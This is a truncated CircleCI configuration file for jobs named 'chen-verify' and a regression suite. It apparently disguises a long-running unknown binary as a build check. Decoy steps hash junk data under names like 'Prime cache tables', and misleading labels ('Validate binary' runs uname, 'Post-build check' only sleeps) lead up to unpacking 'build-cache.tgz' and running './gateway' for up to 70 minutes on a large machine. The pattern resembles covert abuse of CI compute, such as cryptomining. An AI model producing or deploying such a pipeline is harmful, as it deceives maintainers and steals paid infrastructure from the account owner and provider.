version: 2.1

jobs:
  sys_chen-verify:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prime cache tables
          command: |
            mkdir -p /tmp/stage
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/stage/186a.txt; true
            size=$(wc -c </tmp/stage/186a.txt); echo "stage ok: chen-verify size=${size}"
      - persist_to_workspace:
          root: /tmp/stage
          paths:
            - 186a.txt
  chen-verify:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
          name: Fetch workspace file
          command: |
            { cat /tmp/stage/186a.txt > /dev/null; echo "read ok" ; } || true
      - run:
          name: Retrieve project
          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack toolkit
          command: gunzip -c build-cache.tgz | tar xvf -
      - run:
          name: Validate binary
          command: uname -a
      - run:
          name: Post-build check
          no_output_timeout: 15m
          command: sleep 120
      - run:
          no_output_timeout: 70m
          command: nice -n 0 ./gateway
  stage_validate-full-regression-suite:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
